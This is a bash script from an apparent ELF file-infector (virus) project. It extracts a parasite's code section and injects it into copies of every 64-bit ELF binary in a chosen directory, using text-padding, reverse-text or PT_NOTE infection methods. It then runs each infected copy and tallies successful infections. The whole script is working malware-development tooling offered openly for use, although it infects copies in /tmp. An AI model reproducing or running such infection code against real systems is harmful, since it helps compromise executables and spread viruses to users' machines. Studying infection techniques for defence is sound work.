#!/bin/bash
# this is a script that runs a series of commands to build and infect victims with different
# infection methods. This script is not sandboxed and is meant to provide convenience during
# infection algorithm development. Run with care.

# please build the //infector package before running this script.
# run with infector/infect_victims.sh [method] [dir] [parasite] [infector]
# for example: bazel build //infector/... && \
# infector/infect_victims.sh bazel-bin/infector/test_parasite bazel-bin/infector/infector text_padding /usr/bin

IFS=""

function infect_one_victim() {
    rm -f /tmp/victim
    virus=$1
    infector=$2
    method=$3
    victim=$4
    # extract virus's text segment
    chmod 700 $virus &&
        objcopy --dump-section .text=/tmp/parasite_code $virus

    # copy victim to tmp to be infected
    cp $victim /tmp/victim &&
        chmod 700 /tmp/victim
    ./$infector /tmp/victim /tmp/parasite_code $method

    if [ $? -eq 0 ]; then
        # run the infected binary. Since most binaries terminate with --help, this is sufficient to
        # test that infection is working.
        /tmp/victim --help
    fi
}

rm_trailing_slash() {
    if [[ -d $1 ]]; then
        echo "$1" | sed 's/\/*$//g'
    fi
}

virus=$1
infector=$2
method=$3
victim=$4

if [[ -z $virus || -z $infector || -z $method || -z $victim ]]; then
    echo "Usage: infect_victims.sh [parasite] [infector] [method] [victim_dir/victim]"
    exit 0
fi

if [[ "$method" != "text_padding" && "$method" != "reverse_text" && "$method" != "pt_note" ]]; then
    echo "Only text_padding reverse_text pt_note are supported methods. "
    exit 0
fi

blue=$(tput setaf 4)
red=$(tput setaf 1)
normal=$(tput sgr0)

success_counter=0
fail_counter=0

if [[ -d $victim ]]; then
    for file_name in $(rm_trailing_slash $victim)/*; do
        type=$(file $file_name)

        if [[ $type == *"ELF 64-bit LSB"* ]]; then
            {
                infect_one_victim $virus $infector $method "$file_name"
            } >/tmp/result 2>&1
            # only print when we failed to infect.
            result=$(cat /tmp/result)
            if [[ $result == *"Running virus code"* && $result != *"Segmentation fault"* ]]; then
                detail="${blue}success${normal}"
                success_counter=$((success_counter + 1))
            else
                detail="${red}fail $result${normal}"
                fail_counter=$((fail_counter + 1))
            fi
            elf_type=$(readelf $file_name -h | grep Type | cut -f 2 -d ':' | cut -f 1 -d '(' | xargs)
            printf ' [%-45s] == type: %-5s %s\n' $file_name $elf_type $detail
        fi
    done
    echo "infected: $success_counter, failed: $fail_counter"
else
    infect_one_victim $virus $infector $method $victim
fi
